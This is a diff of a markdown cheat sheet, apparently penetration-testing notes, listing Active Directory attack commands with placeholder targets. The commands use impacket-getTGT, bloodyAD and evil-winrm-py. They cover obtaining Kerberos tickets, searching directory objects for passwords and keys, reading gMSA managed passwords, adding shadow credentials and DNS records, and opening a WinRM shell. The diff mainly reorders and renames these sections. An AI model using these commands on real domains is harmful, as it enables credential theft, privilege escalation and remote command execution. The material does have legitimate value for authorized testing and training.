@@ -2,11 +2,24 @@
 ## Guide
 https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
 
-## .ccache
+## Get a Ticket Granting Ticket
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD'; kcme
 
-## .ccache to evil-winrm
-evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
+## Writable
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get writable --detail
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object User | grep -Ei 'pass|pwd' | grep -vE 'bad|Last|Time' | cat
+
+## Search: Computers
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306368)))" | grep -av 'nTSecurityDescriptor:' | tee out_computers-info
+
+## Search: Users
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306369)))" | grep -av 'nTSecurityDescriptor:' | tee out_users-info
+
+## Search: Members of Groups
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=group)(member=*))" --attr 'member','sAMAccountName' | sed -E '/^member: /{s/member: //;s/; */;\n/g;s/^/member:\n/;}' | tee out_membersofgroups-info
+
+## Search: Passwords and Keys
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=*))" | grep -a -Ei 'pass|pwd|key'
 
 ## ReadGMSAPassword
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object 'SVC_ACC$' --attr msDS-ManagedPassword
@@ -72,22 +85,8 @@ bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add shadowCredentials 'TARGET'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add add uac 'TARGET'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dnsRecord 'xxx.domain.example' '8.8.8.8'
 
-## Get
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get writable --detail
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object User | grep -Ei 'pass|pwd' | grep -vE 'bad|Last|Time' | cat
-
-## Search
--->> Computers
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306368)))" | grep -av 'nTSecurityDescriptor:' | tee out_computers-info
-
--->> Users
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306369)))" | grep -av 'nTSecurityDescriptor:' | tee out_users-info
-
--->> Members of Groups
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=group)(member=*))" --attr 'member','sAMAccountName' | sed -E '/^member: /{s/member: //;s/; */;\n/g;s/^/member:\n/;}' | tee out_membersofgroups-info
-
--->> Passwords and Keys
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=*))" | grep -a -Ei 'pass|pwd|key'
+## Execute Commands: WINRM
+evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
 
 ## Permissions
 adminCount
